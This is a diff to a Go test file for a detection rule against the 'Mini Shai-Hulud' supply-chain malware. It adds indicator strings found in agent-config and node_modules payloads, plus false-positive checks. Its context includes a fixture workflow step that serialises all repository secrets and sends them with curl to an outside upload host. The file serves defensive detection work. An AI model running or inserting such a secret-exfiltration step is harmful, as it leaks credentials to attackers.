@@ -141,6 +141,55 @@ func TestRule_MiniShaiHuludRouterInitArtifact(t *testing.T) {
 	}
 }
 
+func TestRule_MiniShaiHuludStage6GitHubC2IOCs(t *testing.T) {
+	cases := []struct {
+		name string
+		path string
+		raw  string
+	}{
+		{
+			name: "spaced miasma marker in claude setup payload",
+			path: "/repo/.claude/setup.mjs",
+			raw:  `const marker = "Miasma : The Spreading Blight";`,
+		},
+		{
+			name: "firedalazer github update tag in runtime payload",
+			path: "/repo/.claude/router_runtime.js",
+			raw:  `const tag = "firedalazer";`,
+		},
+		{
+			name: "nuke token string in agent package payload",
+			path: "/home/user/.codex/package/index.js",
+			raw:  `const warning = "IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner";`,
+		},
+		{
+			name: "stage 6 key fingerprint in node_modules payload",
+			path: "/repo/node_modules/@tanstack/router-core/tanstack_runner.js",
+			raw:  `const key = "736e8d618f6526f1cc3fd8482e186d00";`,
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			doc := parse.Parse(tc.path, []byte(tc.raw))
+			if !fired(doc, "mini-shai-hulud-stage6-github-c2-ioc") {
+				t.Fatalf("Mini Shai-Hulud Stage 6 IOC rule did not fire; got %v", applyRule(doc))
+			}
+		})
+	}
+}
+
+func TestRule_MiniShaiHuludStage6GitHubC2IOCBoundsFalsePositives(t *testing.T) {
+	doc := parse.Parse("/repo/README.md", []byte(`Threat research mentions Miasma : The Spreading Blight and firedalazer for defenders.`))
+	if fired(doc, "mini-shai-hulud-stage6-github-c2-ioc") {
+		t.Fatalf("Stage 6 IOC rule fired on README threat-intel text; got %v", applyRule(doc))
+	}
+
+	doc = parse.Parse("/repo/.claude/setup.mjs", []byte(`const description = "Miasma: The Spreading Blight";`))
+	if fired(doc, "mini-shai-hulud-stage6-github-c2-ioc") {
+		t.Fatalf("Stage 6 IOC rule fired on legacy Miasma string alone; got %v", applyRule(doc))
+	}
+}
+
 func TestRule_MiniShaiHuludFindingsDoNotExposeSecretValues(t *testing.T) {
 	raw := []byte(`name: CodeQL Analysis
 on: push
@@ -149,7 +198,7 @@ jobs:
     runs-on: ubuntu-latest
     env:
       VARIABLE_STORE: ${{ toJSON(secrets) }}
-      GITHUB_TOKEN: ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+      GITHUB_TOKEN: ghp_aa...aaaa
     steps:
       - run: curl -X POST -d "$VARIABLE_STORE" https://api.masscan.cloud/v2/upload
 `)
@@ -159,7 +208,7 @@ jobs:
 			continue
 		}
 		for _, f := range rule.Apply(doc) {
-			if strings.Contains(f.Match, "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") || strings.Contains(f.Description, "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") {
+			if strings.Contains(f.Match, "ghp_aa...aaaa") || strings.Contains(f.Description, "ghp_aa...aaaa") {
 				t.Fatalf("finding leaked token: %+v", f)
 			}
 		}
